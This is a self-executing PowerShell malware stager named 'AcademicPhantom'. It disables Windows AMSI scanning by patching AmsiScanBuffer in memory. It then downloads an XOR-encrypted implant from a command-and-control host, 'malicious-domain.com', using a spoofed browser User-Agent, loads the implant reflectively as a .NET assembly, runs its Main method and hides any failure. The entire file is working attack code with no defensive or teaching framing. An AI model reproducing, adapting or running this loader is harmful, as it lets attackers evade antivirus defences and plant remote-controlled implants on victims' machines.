# AcademicPhantom PowerShell Stager
# In-memory loader for the main implant

function Invoke-PhantomStager {
    param(
        [string]$C2Server = "malicious-domain.com",
        [int]$SleepTime = 60
    )
    
    # AMSI Bypass
    $WinAPI = @"
    using System;
    using System.Runtime.InteropServices;
    public class WinAPI {
        [DllImport("kernel32")]
        public static extern IntPtr GetProcAddress(IntPtr hModule, string procName);
        [DllImport("kernel32")]
        public static extern IntPtr LoadLibrary(string name);
        [DllImport("kernel32")]
        public static extern bool VirtualProtect(IntPtr lpAddress, UIntPtr dwSize, uint flNewProtect, out uint lpflOldProtect);
    }
"@
    Add-Type $WinAPI
    
    # Patch AMSI
    $amsi = [WinAPI]::LoadLibrary("amsi.dll")
    $scan = [WinAPI]::GetProcAddress($amsi, "AmsiScanBuffer")
    $old = 0
    [WinAPI]::VirtualProtect($scan, [UIntPtr]::new(5), 0x40, [ref]$old)
    $patch = [Byte[]] (0xB8, 0x57, 0x00, 0x07, 0x80, 0xC3)
    [System.Runtime.InteropServices.Marshal]::Copy($patch, 0, $scan, 6)
    
    # Download payload
    $url = "https://$C2Server/implant.bin"
    $wc = New-Object System.Net.WebClient
    $wc.Headers.Add("User-Agent", "Mozilla/5.0 (Windows NT 10.0; Win64; x64)")
    
    try {
        $encrypted = $wc.DownloadData($url)
        
        # Decrypt payload (XOR key)
        $key = [System.Text.Encoding]::UTF8.GetBytes("AcademicPhantom2024")
        $payload = New-Object byte[] $encrypted.Length
        
        for ($i = 0; $i -lt $encrypted.Length; $i++) {
            $payload[$i] = $encrypted[$i] -bxor $key[$i % $key.Length]
        }
        
        # Load into memory
        $assembly = [System.Reflection.Assembly]::Load($payload)
        
        # Execute entry point
        $entry = $assembly.GetTypes() | Where-Object { 
            $_.GetMethods() | Where-Object { $_.Name -eq "Main" } 
        } | Select-Object -First 1
        
        $method = $entry.GetMethod("Main")
        $method.Invoke($null, @())
        
    } catch {
        # Silent fail
    }
}

# Execute
Invoke-PhantomStager